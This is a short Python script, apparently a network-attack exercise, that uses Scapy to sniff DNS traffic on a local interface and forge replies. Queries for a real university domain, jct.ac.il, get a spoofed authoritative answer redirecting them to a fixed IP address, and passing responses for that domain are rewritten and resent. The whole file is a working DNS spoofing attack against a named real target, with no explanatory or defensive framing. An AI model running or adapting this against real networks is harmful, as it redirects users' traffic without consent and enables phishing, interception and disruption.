import subprocess
import optparse
from scapy.all import *
from scapy.layers.dns import DNSRR, DNS, DNSQR
from scapy.layers.inet import IP, UDP


def dnsSpoof(packet):
    redirect_to = '216.58.207.78'
    target = "jct.ac.il."
    if DNSQR in packet and packet.dport == 53:
        print(packet.qd.qname)
        if(packet.qd.qname == target):
            spoofed_pkt = IP(dst=packet[IP].src, src=packet[IP].dst) / \
                           UDP(dport=packet[UDP].sport, sport=packet[UDP].dport) / \
                           DNS(id=packet[DNS].id, qd=packet[DNS].qd, aa=1, qr=1,
                           an=DNSRR(rrname=packet[DNS].qd.qname, ttl=10, rdata=redirect_to))

            packet.qd.qname = target
            send(spoofed_pkt)


    elif DNSRR in packet and packet.sport == 53:
        if(packet.an.rrname == target):
            packet.an.rdata = redirect_to
            print(packet.an.ttl)
            send(packet)
            print(packet.an.rdata)
            print(packet.an.rrname)


interface = 'eth0'


sniffed = sniff(iface=interface, filter="udp and port 53", prn=dnsSpoof)